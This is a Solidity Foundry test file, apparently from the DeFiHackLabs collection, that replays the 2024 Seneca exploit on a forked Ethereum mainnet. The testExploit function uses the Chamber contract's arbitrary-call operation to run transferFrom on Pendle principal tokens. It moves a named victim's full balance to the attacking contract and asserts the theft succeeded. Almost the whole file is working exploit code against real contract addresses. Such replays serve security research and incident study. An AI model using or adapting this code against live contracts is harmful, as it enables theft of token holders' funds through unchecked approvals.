// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Source: DeFiHackLabs, src/test/2024-02/Seneca_exp.sol (Apache-2.0; slightly shortened, forge-std only).
import "forge-std/Test.sol";

interface IERC20Min {
    function balanceOf(address) external view returns (uint256);
    function decimals() external view returns (uint8);
}

interface IChamber {
    function performOperations(
        uint8[] memory actions,
        uint256[] memory values,
        bytes[] memory datas
    ) external payable returns (uint256 value1, uint256 value2);
}

contract SenecaExploit is Test {
    IChamber private constant Chamber = IChamber(0x65c210c59B43EB68112b7a4f75C8393C36491F06);
    IERC20Min private constant PendlePrincipalToken = IERC20Min(0xB05cABCd99cf9a73b19805edefC5f67CA5d1895E);
    address private constant victim = 0x9CBF099ff424979439dFBa03F00B5961784c06ce;
    uint8 public constant OPERATION_CALL = 30;

    function setUp() public {
        vm.createSelectFork("mainnet", 19_325_936);
        vm.label(address(Chamber), "Chamber");
        vm.label(address(PendlePrincipalToken), "PendlePrincipalToken");
        vm.label(victim, "victim");
    }

    function testExploit() public {
        uint256 amount = PendlePrincipalToken.balanceOf(victim);
        bytes memory callData =
            abi.encodeWithSignature("transferFrom(address,address,uint256)", victim, address(this), amount);
        bytes memory data = abi.encode(address(PendlePrincipalToken), callData, uint256(0), uint256(0), uint256(0));
        bytes[] memory datas = new bytes[](1);
        datas[0] = data;
        uint8[] memory actions = new uint8[](1);
        actions[0] = OPERATION_CALL;
        uint256[] memory values = new uint256[](1);
        values[0] = 0;

        Chamber.performOperations(actions, values, datas);

        assertEq(PendlePrincipalToken.balanceOf(address(this)), amount, "tokens not taken");
    }
}
